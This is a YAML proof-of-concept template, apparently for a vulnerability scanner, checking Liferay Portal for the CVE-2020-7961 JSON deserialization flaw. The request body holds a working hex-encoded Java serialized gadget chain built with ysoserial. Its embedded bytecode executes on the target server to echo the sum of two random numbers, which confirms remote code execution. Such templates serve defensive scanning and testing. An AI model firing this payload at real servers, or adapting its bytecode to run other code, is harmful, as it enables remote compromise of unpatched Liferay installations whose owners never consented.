name: poc-yaml-liferayportal-cve-2020-7961
binding: c850557f-108b-41de-821b-02f20b817d66
manual: true
detail:
    author: Litch1
    links:
        - https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
    vulnerability:
        id: CT-37865
        level: critical
    description: multiple critical rated JSON deserialization vulnerabilities affecting the Liferay Portal versions 6.1, 6.2, 7.0, 7.1, and 7.2
transport: http
set:
    r1: randomInt(80000000, 100000000)
    r2: randomInt(80000000, 100000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/jsonws/invoke?a={{r1}}&b={{r2}}
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=<validtoken>&formDate=<date>&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F400000000000007708000000020000000273720028636F6D2E73756E2E73796E6469636174696F6E2E666565642E696D706C2E4F626A6563744265616E829907DE7604944A0200034C000E5F636C6F6E6561626C654265616E74002D4C636F6D2F73756E2F73796E6469636174696F6E2F666565642F696D706C2F436C6F6E6561626C654265616E3B4C000B5F657175616C734265616E74002A4C636F6D2F73756E2F73796E6469636174696F6E2F666565642F696D706C2F457175616C734265616E3B4C000D5F746F537472696E674265616E74002C4C636F6D2F73756E2F73796E6469636174696F6E2F666565642F696D706C2F546F537472696E674265616E3B78707372002B636F6D2E73756E2E73796E6469636174696F6E2E666565642E696D706C2E436C6F6E6561626C654265616EDD61BBC5334F6B770200024C00115F69676E6F726550726F7065727469657374000F4C6A6176612F7574696C2F5365743B4C00045F6F626A7400124C6A6176612F6C616E672F4F626A6563743B78707372001E6A6176612E7574696C2E436F6C6C656374696F6E7324456D70747953657415F5721DB403CB2802000078707371007E00027371007E000771007E000C7372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E0020000787000000C80CAFEBABE0000003200860A0003002207008407002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E010043636F6D2E6C6966657261792E706F7274616C2E6B65726E656C2E73656375726974792E6163636573732E636F6E74726F6C2E416363657373436F6E74726F6C5574696C08002A01000F6A6176612F6C616E672F436C61737307002C010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0C002E002F0A002D0030010043636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F6163636573732F636F6E74726F6C2F416363657373436F6E74726F6C5574696C070032010017676574416363657373436F6E74726F6C436F6E7465787401004028294C636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F617574682F416363657373436F6E74726F6C436F6E746578743B0C003400350A0033003601003C636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F617574682F416363657373436F6E74726F6C436F6E7465787407003801000B676574526573706F6E736501002A28294C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0C003A003B0A0039003C01000A6765745265717565737401002928294C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B0C003E003F0A003900400100206A6176612F6C616E672F436C6173734E6F74466F756E64457863657074696F6E070042010030636F6D2E6C6966657261792E706F7274616C2E73656375726974792E61632E416363657373436F6E74726F6C5574696C0800440800340100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0C004700480A002D0049010035636F6D2E6C6966657261792E706F7274616C2E73656375726974792E617574682E416363657373436F6E74726F6C436F6E7465787408004B08003A08003E0100186A6176612F6C616E672F7265666C6563742F4D6574686F6407004F010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0C005100520A005000530100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650700550100256A617661782F736572766C65742F687474702F48747470536572766C65745265717565737407005701001D6A617661782F736572766C65742F536572766C6574526573706F6E736507005901000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0C005B005C0B005A005D0100016108005F01001C6A617661782F736572766C65742F536572766C65745265717565737407006101000C676574506172616D65746572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0C006300640B006200650100116A6176612F6C616E672F496E746567657207006701000776616C75654F66010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F496E74656765723B0C0069006A0A0068006B010008696E7456616C75650100032829490C006D006E0A0068006F010001620800710100106A6176612F6C616E672F537472696E670700730100152849294C6A6176612F6C616E672F537472696E673B0C006900750A0074007601000E6A6176612F696F2F5772697465720700780100057772697465010015284C6A6176612F6C616E672F537472696E673B29560C007A007B0A0079007C010005666C7573680C007E000B0A0079007F0100136A6176612F6C616E672F457863657074696F6E07008101000D537461636B4D61705461626C6501001D79736F73657269616C2F50776E6572373737303334393539373137303001001F4C79736F73657269616C2F50776E657237373730333439353937313730303B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F008500000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000035000E00000020000300000001000F0085000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D0000000600010000003A000E0000002A000400000001000F008500000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C000000F00005000B000000A9A70003014C122BB8003157B80037B6003D4DB80037B600414EA700513A041245B80031124601B6004A3A05124CB80031124D01B6004A3A06124CB80031124E01B6004A3A07190619050101B6005401B60054C000564D190719050101B6005401B60054C000584EA700032CB9005E01003A082D1260B900660200B8006CB600702D1272B900660200B8006CB6007060360919081509B80077B6007D1908B60080A700083A0AA70003B1000200050019001C0043000500A000A300820001008300000025000503FF0018000200050001070043FD004D070056070058FF0038000200050001070082040002002000000002002100110000000A000100020023001000097571007E0017000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003E000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E72707701007873720028636F6D2E73756E2E73796E6469636174696F6E2E666565642E696D706C2E457175616C734265616EF58A18BBE5F618110200024C000A5F6265616E436C6173737400114C6A6176612F6C616E672F436C6173733B4C00045F6F626A71007E000978707672001D6A617661782E786D6C2E7472616E73666F726D2E54656D706C617465730000000000000000000000787071007E00147372002A636F6D2E73756E2E73796E6469636174696F6E2E666565642E696D706C2E546F537472696E674265616E09F58E4A0F23EE310200024C000A5F6265616E436C61737371007E001C4C00045F6F626A71007E0009787071007E001F71007E00147371007E001B7671007E000271007E000D7371007E002071007E002371007E000D71007E000671007E000671007E000678;"}
        expression: response.body.bcontains(bytes(string(r1 + r2)))
expression: r0()
